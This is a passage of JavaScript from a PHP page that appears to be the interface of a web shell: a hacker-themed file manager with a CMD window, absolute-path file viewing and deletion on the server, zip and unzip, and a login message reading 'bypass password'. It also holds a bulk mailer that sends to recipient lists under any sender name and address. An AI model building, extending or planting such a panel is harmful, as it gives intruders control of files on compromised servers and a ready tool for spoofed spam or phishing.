            // Touch: single tap opens
            browserDockBtn.addEventListener('touchend', function(ev){
              if (browserDragging) return;
              var trigger = document.getElementById('browser-trigger');
              if (trigger) { trigger.click(); }
            }, { passive: true });
            function browserStartDrag(ev){
              browserDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = browserDockBtn.getBoundingClientRect();
              browserOffsetX = point.clientX - rect.left;
              browserOffsetY = point.clientY - rect.top;
              browserDockBtn.style.transition = 'none';
              browserDockBtn.style.transform = 'none';
              browserDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', browserOnDrag);
              document.addEventListener('touchmove', browserOnDrag, { passive: false });
              document.addEventListener('mouseup', browserEndDrag);
              document.addEventListener('touchend', browserEndDrag);
            }
            function browserOnDrag(ev){
              if (!browserDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - browserOffsetX;
              var top = point.clientY - browserOffsetY;
              var maxLeft = window.innerWidth - browserDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - browserDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              browserDockBtn.style.left = left + 'px';
              browserDockBtn.style.top = top + 'px';
              updateDockLabelPosition(browserDockBtn);
              browserDockPos = { left: left, top: top };
            }
            function browserEndDrag(){
              if (!browserDragging) return;
              browserDragging = false;
              browserDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', browserOnDrag);
              document.removeEventListener('touchmove', browserOnDrag);
              document.removeEventListener('mouseup', browserEndDrag);
              document.removeEventListener('touchend', browserEndDrag);
            }
            browserDockBtn.addEventListener('mousedown', browserStartDrag);
            browserDockBtn.addEventListener('touchstart', browserStartDrag, { passive: true });
          }
          // Notes dock behavior
          if (notesDockBtn) {
            // Single click: open a new notes window
            notesDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (notesDragging) return;
              var trigger = document.getElementById('notes-trigger');
              if (trigger) { trigger.click(); }
            });
            // Touch: single tap opens a notes window
            notesDockBtn.addEventListener('touchend', function(ev){
              if (notesDragging) return;
              var trigger = document.getElementById('notes-trigger');
              if (trigger) { trigger.click(); }
            }, { passive: true });

            function notesStartDrag(ev){
              notesDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = notesDockBtn.getBoundingClientRect();
              notesOffsetX = point.clientX - rect.left;
              notesOffsetY = point.clientY - rect.top;
              notesDockBtn.style.transition = 'none';
              notesDockBtn.style.transform = 'none';
              notesDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', notesOnDrag);
              document.addEventListener('touchmove', notesOnDrag, { passive: false });
              document.addEventListener('mouseup', notesEndDrag);
              document.addEventListener('touchend', notesEndDrag);
            }
            function notesOnDrag(ev){
              if (!notesDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - notesOffsetX;
              var top = point.clientY - notesOffsetY;
              var maxLeft = window.innerWidth - notesDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - notesDockBtn.offsetHeight - 8;
              if (left < 8) left = 8; if (top < 8) top = 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              notesDockBtn.style.left = left + 'px';
              notesDockBtn.style.top = top + 'px';
              updateDockLabelPosition(notesDockBtn);
              notesDockPos = { left: left, top: top };
            }
            function notesEndDrag(){
              if (!notesDragging) return;
              notesDragging = false;
              notesDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', notesOnDrag);
              document.removeEventListener('touchmove', notesOnDrag);
              document.removeEventListener('mouseup', notesEndDrag);
              document.removeEventListener('touchend', notesEndDrag);
            }
            notesDockBtn.addEventListener('mousedown', notesStartDrag);
            notesDockBtn.addEventListener('touchstart', notesStartDrag, { passive: true });
          }
          // Wallpaper dock behavior
          if (wpDockBtn) {
            // Single click: open Wallpaper window
            wpDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (wpDragging) return; // ignore clicks during drag
              var trigger = document.getElementById('wallpaper-trigger');
              if (trigger) { trigger.click(); } else { spawnWallpaperWindow(); }
            });
            // Double-click: also open (for consistency)
            wpDockBtn.addEventListener('dblclick', function(ev){
              if (wpDragging) { ev.preventDefault(); return; }
              var trigger = document.getElementById('wallpaper-trigger');
              if (trigger) { trigger.click(); } else { spawnWallpaperWindow(); }
            });
            // Touch: single tap opens
            wpDockBtn.addEventListener('touchend', function(ev){
              if (wpDragging) return; // drag end handled elsewhere
              var trigger = document.getElementById('wallpaper-trigger');
              if (trigger) { trigger.click(); } else { spawnWallpaperWindow(); }
            }, { passive: true });
            function wpStartDrag(ev){
              wpDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = wpDockBtn.getBoundingClientRect();
              wpOffsetX = point.clientX - rect.left;
              wpOffsetY = point.clientY - rect.top;
              wpDockBtn.style.transition = 'none';
              wpDockBtn.style.transform = 'none';
              wpDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', wpOnDrag);
              document.addEventListener('touchmove', wpOnDrag, { passive: false });
              document.addEventListener('mouseup', wpEndDrag);
              document.addEventListener('touchend', wpEndDrag);
            }
            function wpOnDrag(ev){
              if (!wpDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - wpOffsetX;
              var top = point.clientY - wpOffsetY;
              var minLeft = 8, minTop = 8;
              var maxLeft = window.innerWidth - wpDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - wpDockBtn.offsetHeight - 8;
              if (left < minLeft) left = minLeft; if (top < minTop) top = minTop;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              wpDockBtn.style.left = left + 'px';
              wpDockBtn.style.top = top + 'px';
              updateDockLabelPosition(wpDockBtn);
              wpDockPos = { left: left, top: top };
            }
            function wpEndDrag(){
              if (!wpDragging) return;
              wpDragging = false;
              wpDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', wpOnDrag);
              document.removeEventListener('touchmove', wpOnDrag);
              document.removeEventListener('mouseup', wpEndDrag);
              document.removeEventListener('touchend', wpEndDrag);
            }
            wpDockBtn.addEventListener('mousedown', wpStartDrag);
            wpDockBtn.addEventListener('touchstart', wpStartDrag, { passive: true });
            // No global fallback listeners; direct icon handlers suffice
          }
          // CMD dock behavior
          if (cmdDockBtn) {
            // Single click: open CMD window
            cmdDockBtn.addEventListener('click', function(ev){
              ev.preventDefault();
              if (cmdDragging) return;
              var trigger = document.getElementById('cmd-trigger');
              if (trigger) { trigger.click(); }
            });
            // Touch: single tap opens CMD window
            cmdDockBtn.addEventListener('touchend', function(ev){
              if (cmdDragging) return;
              var trigger = document.getElementById('cmd-trigger');
              if (trigger) { trigger.click(); }
            }, { passive: true });
            function cmdStartDrag(ev){
              cmdDragging = true;
              var point = ev.touches ? ev.touches[0] : ev;
              var rect = cmdDockBtn.getBoundingClientRect();
              cmdOffsetX = point.clientX - rect.left;
              cmdOffsetY = point.clientY - rect.top;
              cmdDockBtn.style.transition = 'none';
              cmdDockBtn.style.transform = 'none';
              cmdDockBtn.setAttribute('aria-grabbed', 'true');
              document.body.style.userSelect = 'none';
              document.addEventListener('mousemove', cmdOnDrag);
              document.addEventListener('touchmove', cmdOnDrag, { passive: false });
              document.addEventListener('mouseup', cmdEndDrag);
              document.addEventListener('touchend', cmdEndDrag);
            }
            function cmdOnDrag(ev){
              if (!cmdDragging) return;
              if (ev.cancelable) ev.preventDefault();
              var point = ev.touches ? ev.touches[0] : ev;
              var left = point.clientX - cmdOffsetX;
              var top = point.clientY - cmdOffsetY;
              var minLeft = 8, minTop = 8;
              var maxLeft = window.innerWidth - cmdDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - cmdDockBtn.offsetHeight - 8;
              if (left < minLeft) left = minLeft; if (top < minTop) top = minTop;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              cmdDockBtn.style.left = left + 'px';
              cmdDockBtn.style.top = top + 'px';
              updateDockLabelPosition(cmdDockBtn);
            }
            function cmdEndDrag(){
              if (!cmdDragging) return;
              cmdDragging = false;
              cmdDockBtn.setAttribute('aria-grabbed', 'false');
              document.body.style.userSelect = '';
              document.removeEventListener('mousemove', cmdOnDrag);
              document.removeEventListener('touchmove', cmdOnDrag);
              document.removeEventListener('mouseup', cmdEndDrag);
              document.removeEventListener('touchend', cmdEndDrag);
              var rect = cmdDockBtn.getBoundingClientRect();
              var left = rect.left, top = rect.top;
              if (left < 8) left = 8; if (top < 8) top = 8;
              var maxLeft = window.innerWidth - cmdDockBtn.offsetWidth - 8;
              var maxTop = window.innerHeight - cmdDockBtn.offsetHeight - 8;
              if (left > maxLeft) left = maxLeft; if (top > maxTop) top = maxTop;
              cmdDockPos = { left: left, top: top };
            }
            cmdDockBtn.addEventListener('mousedown', cmdStartDrag);
            cmdDockBtn.addEventListener('touchstart', cmdStartDrag, { passive: true });
          }
          // Recalculate label position on viewport resize
          window.addEventListener('resize', function(){
            updateDockLabelPosition(dockBtn);
            updateDockLabelPosition(notesDockBtn);
            updateDockLabelPosition(browserDockBtn);
            updateDockLabelPosition(cmdDockBtn);
            updateDockLabelPosition(wpDockBtn);
            updateDockLabelPosition(settingsDockBtn);
          
            // If minimized and icons haven't been dragged, keep them aligned in a row
            if (document.body.classList.contains('minimized')) {
              positionDockRow();
            }
          });
          // About modal handlers
          var aboutTrigger = document.getElementById('about-trigger');
          var aboutOverlay = document.getElementById('about-overlay');
          var aboutCloseBtn = document.getElementById('about-close-btn');
          function openAbout(e){ if (e) e.preventDefault(); if (aboutOverlay) { aboutOverlay.classList.add('show'); var yearEl = document.getElementById('about-year'); if (yearEl) { try { yearEl.textContent = String(new Date().getFullYear()); } catch(e){} } } }
          function closeAbout(){ if (aboutOverlay) aboutOverlay.classList.remove('show'); }
          if (aboutTrigger) aboutTrigger.addEventListener('click', openAbout);
          if (aboutCloseBtn) aboutCloseBtn.addEventListener('click', closeAbout);
          if (aboutOverlay) aboutOverlay.addEventListener('click', function(ev){ if (ev.target === aboutOverlay) closeAbout(); });
          document.addEventListener('keydown', function(ev){ if (ev.key === 'Escape') closeAbout(); });
        var overlay = document.getElementById('dl-terminal-overlay');
        var output = document.getElementById('dl-term-output');
        function typeText(text, cb, speed){
            var i = 0; speed = speed || 40;
            function step(){
                output.textContent += text.charAt(i);
                i++;
                if (i < text.length){ setTimeout(step, speed); } else { if (typeof cb === 'function') cb(); }
            }
            step();
        }
        function fileNameFromHref(href){
            try {
                var u = new URL(href, window.location.href);
                var rel = u.searchParams.get('download') || '';
                rel = decodeURIComponent(rel);
                var parts = rel.split(/[\\\/]/);
                return parts.pop() || rel || 'file';
            } catch(e){ return 'file'; }
        }
        function animateDownload(href, kind){
            overlay.classList.add('show');
            output.textContent = 'C\\> ';
            var fname = fileNameFromHref(href);
            var cmd;
            if (kind === 'dir') {
                cmd = './downlaod ' + fname + ' --helpdownload folder -z zip folder -d download';
            } else {
                cmd = './downlaod ' + fname + ' --helpdownload file -z -sh d download';
            }
            typeText(cmd, function(){
                output.textContent += '\n';
                typeText('importing ', function(){
                    var dots = 0;
                    var base = 'C\\> ' + cmd + '\nimporting ';
                    var dotTimer = setInterval(function(){
                        dots = (dots + 1) % 4;
                        output.textContent = base + '.'.repeat(dots);
                    }, 300);
                    setTimeout(function(){
                        clearInterval(dotTimer);
                        output.textContent = base + '.... done';
                        setTimeout(function(){
                            overlay.classList.remove('show');
                            window.location.href = href;
                        }, 600);
                    }, 3000);
                }, 40);
            }, 40);
        }
        // Hook all download links
        document.addEventListener('click', function(ev){
            var a = ev.target.closest('a');
            if (!a) return;
            var href = a.getAttribute('href') || '';
            if (href.indexOf('download=') !== -1){
                ev.preventDefault();
                var kind = a.getAttribute('data-kind') || '';
                animateDownload(href, kind);
            }
            // Image preview links (raw streaming)
            if (a.classList.contains('img-view') && (href.indexOf('raw=') !== -1 || href.indexOf('raw_abs=') !== -1)){
                ev.preventDefault();
                try {
                    var imgOverlay = document.getElementById('img-terminal-overlay');
                    var out = document.getElementById('img-term-output');
                    var imgEl = document.getElementById('img-preview');
                    if (!imgOverlay || !out || !imgEl) return;
                    out.textContent = 'C\\> preview ' + (function(){
                        try { var u = new URL(href, window.location.href); return decodeURIComponent(u.search.slice(1)); } catch(e){ return 'image'; }
                    })();
                    imgEl.src = href;
                    imgOverlay.classList.add('show');
                } catch(e){}
            }
            // Delete links: show terminal-style confirmation overlay (type 'yes' then Enter) without visible input
            if (href.indexOf('delete_abs=1') !== -1 || href.indexOf('delete=1') !== -1){
                ev.preventDefault();
                try {
                    var delOverlay = document.getElementById('del-terminal-overlay');
                    var delOut = document.getElementById('del-term-output');
                    var closeBtn = document.getElementById('del-term-close-btn');
                    if (!delOverlay || !delOut || !closeBtn) return;
                    // Show command line prompt and store pending URL
                    var pendingUrl = href;
                    var cmdLine = '~ % rm ' + (function(){
                        try { var u = new URL(href, window.location.href); return decodeURIComponent(u.search.slice(1)); } catch(e){ return 'file'; }
                    })();
                    var typedBuffer = '';
                    var cursorOn = true;
                    var hintText = 'Write Y and click enter to continue';
                    function renderPrompt(){
                        delOut.textContent = cmdLine + '\n' + hintText + '\nconfirm: ' + typedBuffer + (cursorOn ? '|' : ' ');
                    }
                    renderPrompt();
                    delOverlay.classList.add('show');
                    try { delOverlay.focus(); } catch(e){}
                    var cursorInterval = setInterval(function(){ cursorOn = !cursorOn; renderPrompt(); }, 520);
                    function proceed(){
                        try {
                            var u = new URL(pendingUrl, window.location.href);
                            var rel = u.searchParams.get('d');
                            var os = u.searchParams.get('os');
                            var form = document.createElement('form');
                            form.method = 'POST';
                            form.action = window.location.pathname + window.location.search;
                            var addField = function(name, value){ var inp = document.createElement('input'); inp.type = 'hidden'; inp.name = name; inp.value = value; form.appendChild(inp); };
                            if (os) { addField('do_delete_abs', '1'); addField('os', os); }
                            else if (rel) { addField('do_delete', '1'); addField('rel', rel); }
                            else { delOverlay.classList.remove('show'); window.location.href = pendingUrl; return; }
                            document.body.appendChild(form);
                            cleanup();
                            form.submit();
                        } catch(e){ delOverlay.classList.remove('show'); window.location.href = pendingUrl; }
                    }
                    function cleanup(){ try { document.removeEventListener('keydown', keyHandler); } catch(e){} try { clearInterval(cursorInterval); } catch(e){} }
                    function cancel(){ cleanup(); delOverlay.classList.remove('show'); }
                    function startDeleting(){
                        var dots = 0; var base = cmdLine + '\n' + 'deleting ';
                        try { clearInterval(cursorInterval); } catch(e){}
                        var timer = setInterval(function(){ dots = (dots + 1) % 4; delOut.textContent = base + '.'.repeat(dots); }, 220);
                        setTimeout(function(){ clearInterval(timer); delOut.textContent = base + '.... done'; proceed(); }, 700);
                    }
                    function keyHandler(ev){
                        if (ev.key === 'Enter'){
                            ev.preventDefault();
                            var v = (typedBuffer || '').trim().toLowerCase();
                            if (v === 'y'){ startDeleting(); }
                        } else if (ev.key === 'Escape'){
                            cancel();
                        } else if (ev.key === 'Backspace'){
                            ev.preventDefault();
                            if (typedBuffer.length > 0){ typedBuffer = typedBuffer.slice(0, -1); renderPrompt(); }
                        } else if (ev.key.length === 1){
                            // Add printable characters
                            typedBuffer += ev.key;
                            renderPrompt();
                        }
                    }
                    document.addEventListener('keydown', keyHandler);
                    closeBtn.onclick = cancel;
                    delOverlay.addEventListener('click', function backdrop(ev){ if (ev.target === delOverlay) cancel(); }, { once:true });
                } catch(e){}
            }
        }, true);
        // Close image preview overlay
        (function(){
          var imgOverlay = document.getElementById('img-terminal-overlay');
          var closeBtn = document.getElementById('img-term-close-btn');
          function close(){ if (imgOverlay) imgOverlay.classList.remove('show'); }
          if (closeBtn) closeBtn.addEventListener('click', close);
          document.addEventListener('keydown', function(ev){ if (ev.key === 'Escape') close(); });
          if (imgOverlay) imgOverlay.addEventListener('click', function(ev){ if (ev.target === imgOverlay) close(); });
        })();
        })();
    </script>

    <script>
      (function(){
        // Show a short success terminal only after server confirms login
        var justLogged = <?php echo $loginFlash ? 'true' : 'false'; ?>;
        if (!justLogged) return;
        var overlay = document.getElementById('login-terminal-overlay');
        var output = document.getElementById('login-term-output');
        function typeText(text, cb, speed){
          var i = 0; speed = speed || 18;
          function step(){
            output.textContent += text.charAt(i);
            i++;
            if (i < text.length){ setTimeout(step, speed); } else { if (typeof cb === 'function') cb(); }
          }
          step();
        }
        overlay.classList.add('show');
        output.textContent = '$ ';
        typeText('./sh bypass password : connecting correct done', function(){
          setTimeout(function(){ overlay.classList.remove('show'); }, 800);
        }, 14);
      })();
    </script>
    <script>
    (function(){
        var overlay = document.getElementById('op-terminal-overlay');
        var output = document.getElementById('op-term-output');
        var closeBtn = document.getElementById('op-term-close-btn');
        function typeText(text, cb, speed){
            var i = 0; speed = speed || 40;
            function step(){
                output.textContent += text.charAt(i);
                i++;
                if (i < text.length){ setTimeout(step, speed); } else { if (typeof cb === 'function') cb(); }
            }
            step();
        }
        function fmtZipName(){
            var d = new Date();
            function pad(n){ return (n<10?'0':'') + n; }
            var name = d.getFullYear().toString()
                + pad(d.getMonth()+1)
                + pad(d.getDate())
                + '-' + pad(d.getHours())
                + pad(d.getMinutes())
                + pad(d.getSeconds())
                + '-zip.zip';
            return name;
        }
        function animateList(cmd, entries, done){
            overlay.classList.add('show');
            output.textContent = 'C\\> ';
            typeText(cmd, function(){
                output.textContent += '\n';
                var i = 0;
                var limit = Math.min(entries.length, 50);
                function next(){
                    if (i < limit){
                        output.textContent += (entries[i] || '') + '\n';
                        i++;
                        setTimeout(next, 50);
                    } else {
                        if (entries.length > limit){ output.textContent += '...\n'; }
                        setTimeout(function(){ done(); }, 300);
                    }
                }
                next();
            }, 40);
        }
        // Hook Zip form
        var zipForm = document.getElementById('zip-form');
        if (zipForm){
            zipForm.addEventListener('submit', function(ev){
                ev.preventDefault();
                var entriesJson = zipForm.getAttribute('data-entries') || '[]';
                var entries = [];
                try { entries = JSON.parse(entriesJson); } catch(e){}
                var nameInput = zipForm.querySelector('input[name="zipname"]');
                if (nameInput){ nameInput.value = fmtZipName(); }
                animateList('./sh zip', entries, function(){ zipForm.submit(); });
            });
        }
        // Hook Unzip form
        var unzipForm = document.getElementById('unzip-form');
        if (unzipForm){
            unzipForm.addEventListener('submit', function(ev){
                ev.preventDefault();
                var entriesJson = unzipForm.getAttribute('data-entries') || '[]';
                var entries = [];
                try { entries = JSON.parse(entriesJson); } catch(e){}
                animateList('./sh unzipping ..', entries, function(){ unzipForm.submit(); });
            });
        }
        // Terminal-style error for create failures (remains open until closed)
        var appError = <?= json_encode($error ?? '') ?>;
        if (appError && typeof appError === 'string' && appError.indexOf('Create failed:') === 0) {
            overlay.classList.add('show');
            overlay.classList.add('error-theme');
            output.textContent = '$ ';
            var detail = appError.replace(/^Create failed:\s*/,'');
            typeText('./sh create : error  ' + detail, function(){ /* keep open */ }, 20);
            if (closeBtn) { closeBtn.addEventListener('click', function(){ overlay.classList.remove('show'); }); }
            document.addEventListener('keydown', function(e){ if (e.key === 'Escape') overlay.classList.remove('show'); }, { once: true });
        }
    })();
    </script>

    <script>
    (function(){
        const trigger = document.getElementById('notes-trigger');
        const template = document.getElementById('notes-template');
        const layer = document.getElementById('notes-layer');

        let counter = 0;
        function newId(){ counter++; return 'notes_' + Date.now() + '_' + counter; }
        function k(id, base){ return base + '_' + id; }

        // Track open Notes windows across refreshes
        function getOpenIds(){
            try {
                const raw = localStorage.getItem('notesOpenIds');
                const arr = raw ? JSON.parse(raw) : [];
                return Array.isArray(arr) ? arr : [];
            } catch(e){ return []; }
        }
        function setOpenIds(arr){
            try { localStorage.setItem('notesOpenIds', JSON.stringify(Array.from(new Set(arr)))); } catch(e){}
        }
        function addOpenId(id){
            const ids = getOpenIds();
            if (!ids.includes(id)) { ids.push(id); setOpenIds(ids); }
        }
        function removeOpenId(id){
            const ids = getOpenIds().filter(x => x !== id);
            setOpenIds(ids);
        }

        function loadNotes(id){
            try {
                const raw = localStorage.getItem(k(id, 'notesItems'));
                const arr = raw ? JSON.parse(raw) : [];
                return Array.isArray(arr) ? arr : [];
            } catch(e){ return []; }
        }
        function saveNotes(id, arr){
            try { localStorage.setItem(k(id, 'notesItems'), JSON.stringify(arr)); } catch(e){}
        }

        function spawnNotesWindow(initialText, existingId){
            if (!template || !layer) return;
            const id = existingId || newId();
            const win = template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            win.setAttribute('data-id', id);
            layer.appendChild(win);
            addOpenId(id);

            const titlebar = win.querySelector('.notes-titlebar');
            const closeBtn = win.querySelector('.notes-close');
            const list = win.querySelector('.notes-list');
            const addBtn = win.querySelector('.notes-add');
            const clearBtn = win.querySelector('.notes-clear');

            let notes = loadNotes(id);
            if (initialText && initialText.trim() !== '') {
                notes.push({ id: String(Date.now()), content: initialText });
                saveNotes(id, notes);
            } else if (!notes || notes.length === 0) {
                // Ensure a blank note exists so user can type immediately
                notes = [{ id: String(Date.now()), content: '' }];
                saveNotes(id, notes);
            }
            function renderNotes(){
                if (!list) return;
                list.innerHTML = '';
                notes.forEach((note, idx) => {
                    const item = document.createElement('div');
                    item.className = 'note-item';
                    item.dataset.id = note.id || String(Date.now() + idx);
                    const ta = document.createElement('textarea');
                    ta.className = 'note-text';
                    ta.placeholder = 'Type note...';
                    ta.value = note.content || '';
                    ta.addEventListener('input', function(){ note.content = ta.value; saveNotes(id, notes); });
                    const actions = document.createElement('div');
                    actions.className = 'note-actions';
                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'btn btn-copy';
                    copyBtn.title = 'Copy to clipboard';
                    copyBtn.setAttribute('aria-label', 'Copy to clipboard');
                    copyBtn.innerHTML = '<span class="material-symbols-rounded">content_copy</span>';
                    copyBtn.addEventListener('click', async function(){
                        const textToCopy = ta.value || '';
                        try {
                            if (navigator.clipboard && navigator.clipboard.writeText) {
                                await navigator.clipboard.writeText(textToCopy);
                            } else {
                                ta.select();
                                document.execCommand('copy');
                                ta.setSelectionRange(ta.value.length, ta.value.length);
                            }
                            const prev = copyBtn.innerHTML;
                            copyBtn.innerHTML = '<span class="material-symbols-rounded">done</span>';
                            setTimeout(()=>{ copyBtn.innerHTML = prev; }, 900);
                        } catch(e) {
                            const prev = copyBtn.innerHTML;
                            copyBtn.innerHTML = '<span class="material-symbols-rounded">error</span>';
                            setTimeout(()=>{ copyBtn.innerHTML = prev; }, 1200);
                        }
                    });
                    const del = document.createElement('button');
                    del.className = 'btn btn-delete';
                    del.title = 'Delete note';
                    del.setAttribute('aria-label', 'Delete note');
                    del.innerHTML = '<span class="material-symbols-rounded">delete</span>';
                    del.addEventListener('click', function(){
                        notes.splice(idx, 1);
                        saveNotes(id, notes); renderNotes();
                    });
                    actions.appendChild(copyBtn);
                    actions.appendChild(del);
                    item.appendChild(ta);
                    item.appendChild(actions);
                    list.appendChild(item);
                });
            }
            renderNotes();

            // Autofocus the first textarea so the user can start typing
            const firstTextarea = win.querySelector('.note-text');
            if (firstTextarea) {
                try {
                    firstTextarea.focus();
                    const len = firstTextarea.value.length;
                    firstTextarea.setSelectionRange(len, len);
                } catch(e) {}
            }

            // Add opens a new notes window (independent)
            addBtn && addBtn.addEventListener('click', function(){ spawnNotesWindow(''); });
            clearBtn && clearBtn.addEventListener('click', function(){ notes = []; saveNotes(id, notes); renderNotes(); });
            closeBtn && closeBtn.addEventListener('click', function(){ win.remove(); removeOpenId(id); });

            // Initial position: stagger away from previous windows
            const existing = layer.querySelectorAll('.notes-window.show').length;
            const baseLeft = 80, baseTop = 120, step = 28;
            const savedLeft = localStorage.getItem(k(id, 'notesLeft'));
            const savedTop = localStorage.getItem(k(id, 'notesTop'));
            if (savedLeft !== null && savedTop !== null) {
                win.style.left = savedLeft + 'px';
                win.style.top = savedTop + 'px';
            } else if (existing === 0) {
                const nw = win.offsetWidth || 520;
                const nh = win.offsetHeight || 360;
                const left = Math.max(6, Math.min(window.innerWidth - nw - 6, Math.round((window.innerWidth - nw) / 2)));
                const top = Math.max(6, Math.min(window.innerHeight - nh - 6, Math.round((window.innerHeight - nh) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } else {
                win.style.left = (baseLeft + step * (existing - 1)) + 'px';
                win.style.top = (baseTop + step * (existing - 1)) + 'px';
            }

            // Draggable per window
            let drag = { active:false, offsetX:0, offsetY:0 };
            function onMouseDown(e){
                drag.active = true;
                const rect = win.getBoundingClientRect();
                drag.offsetX = e.clientX - rect.left;
                drag.offsetY = e.clientY - rect.top;
                document.addEventListener('mousemove', onMouseMove);
                document.addEventListener('mouseup', onMouseUp);
            }
            function onMouseMove(e){
                if (!drag.active) return;
                const x = Math.max(6, Math.min(window.innerWidth - win.offsetWidth - 6, e.clientX - drag.offsetX));
                const y = Math.max(6, Math.min(window.innerHeight - win.offsetHeight - 6, e.clientY - drag.offsetY));
                win.style.left = x + 'px';
                win.style.top = y + 'px';
            }
            function onMouseUp(){
                drag.active = false;
                document.removeEventListener('mousemove', onMouseMove);
                document.removeEventListener('mouseup', onMouseUp);
                try {
                    const left = parseInt(win.style.left || '80', 10);
                    const top = parseInt(win.style.top || '120', 10);
                    localStorage.setItem(k(id, 'notesLeft'), String(left));
                    localStorage.setItem(k(id, 'notesTop'), String(top));
                } catch(e){}
            }
            titlebar && titlebar.addEventListener('mousedown', onMouseDown);

            return win;
        }

        // Restore previously open windows on load
        (function(){
            const ids = getOpenIds();
            ids.forEach(function(id){ spawnNotesWindow('', id); });
        })();

        // Each click opens a new independent notes window
        trigger && trigger.addEventListener('click', function(e){ e.preventDefault(); spawnNotesWindow(''); });
    })();
    </script>

    <script>
    // Mailer popup functionality
    (function(){
        const trigger = document.getElementById('mailer-trigger');
        const template = document.getElementById('mailer-template');
        const layer = document.getElementById('mailer-layer');

        function spawnMailerWindow(){
            if (!template || !layer) return null;
            
            const win = template.cloneNode(true);
            win.removeAttribute('id');
            win.style.display = '';
            win.classList.add('show');
            layer.appendChild(win);
            try { localStorage.setItem('app.mailer.open', '1'); } catch(e){}
            // Initial center position so it is visible on desktop
            try {
                const mw = win.offsetWidth || 580;
                const mh = win.offsetHeight || 420;
                const left = Math.max(6, Math.min(window.innerWidth - mw - 6, Math.round((window.innerWidth - mw) / 2)));
                const top = Math.max(6, Math.min(window.innerHeight - mh - 6, Math.round((window.innerHeight - mh) / 2)));
                win.style.left = left + 'px';
                win.style.top = top + 'px';
            } catch(e) {}

            const titlebar = win.querySelector('.mailer-titlebar');
            const closeBtn = win.querySelector('.mailer-close');
            const form = win.querySelector('.mailer-form');
            const sendBtn = win.querySelector('.mailer-send');
            const statusDiv = win.querySelector('.mailer-status');
            const outputDiv = win.querySelector('.mailer-output');

            // Close button handler
            closeBtn && closeBtn.addEventListener('click', function(){ 
                win.remove(); 
                try { localStorage.setItem('app.mailer.open', '0'); } catch(e){}
            });

            // Form submission handler
            sendBtn && sendBtn.addEventListener('click', async function(e){
                e.preventDefault();
                
                const formData = new FormData(form);
                const recipients = formData.get('recipients').split('\n').filter(email => email.trim());
                const format = formData.get('format');
                
                if (recipients.length === 0) {
                    statusDiv.textContent = 'Please add at least one recipient email.';
                    statusDiv.style.color = '#ff7b7b';
                    return;
                }

                // Validate email addresses
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                const invalidEmails = recipients.filter(email => !emailRegex.test(email.trim()));
                if (invalidEmails.length > 0) {
                    statusDiv.textContent = 'Invalid email addresses: ' + invalidEmails.join(', ');
                    statusDiv.style.color = '#ff7b7b';
                    return;
                }

                // Disable send button and show progress
                sendBtn.disabled = true;
                statusDiv.textContent = `Sending ${recipients.length} emails...`;
                statusDiv.style.color = '#9aa3af';
                if (outputDiv) outputDiv.innerHTML = '';

                let sentCount = 0;
                let failCount = 0;

                for (const rawEmail of recipients) {
                    const email = rawEmail.trim();
                    const line = document.createElement('div');
                    line.className = 'pending';
                    line.textContent = `$ -sh ${email} sending ...`;
                    if (outputDiv) {
                        outputDiv.appendChild(line);
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    }

                    const payload = {
                        from_email: formData.get('from_email'),
                        from_name: formData.get('from_name'),
                        subject: formData.get('subject'),
                        message: formData.get('message'),
                        format: format,
                        recipients: [email]
                    };

                    try {
                        const resp = await fetch('?mailer_send=1', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });
                        const data = await resp.json();
                        if (data && data.success) {
                            sentCount += (data.sent || 1);
                            line.className = 'ok';
                            line.textContent = `$ -sh ${email} sending ... done`;
                        } else {
                            failCount += 1;
                            line.className = 'err';
                            const errMsg = (data && (data.error || (data.errors && data.errors[0]) || 'error')) || 'error';
                            line.textContent = `$ -sh ${email} sending ... error: ${errMsg}`;
                        }
                    } catch(err) {
                        failCount += 1;
                        line.className = 'err';
                        line.textContent = `$ -sh ${email} sending ... network error: ${err.message}`;
                    }

                    if (outputDiv) {
                        outputDiv.scrollTop = outputDiv.scrollHeight;
                    }
                }

                // Final status
                if (failCount === 0 && sentCount > 0) {
                    statusDiv.textContent = `Successfully sent ${sentCount} emails.`;
                    statusDiv.style.color = '#2ecc71';
                } else if (sentCount > 0) {
                    statusDiv.textContent = `Done with ${sentCount} sent, ${failCount} failed.`;
                    statusDiv.style.color = '#f59e0b';
                } else {
                    statusDiv.textContent = `All failed (${failCount}).`;
                    statusDiv.style.color = '#ff7b7b';
                }

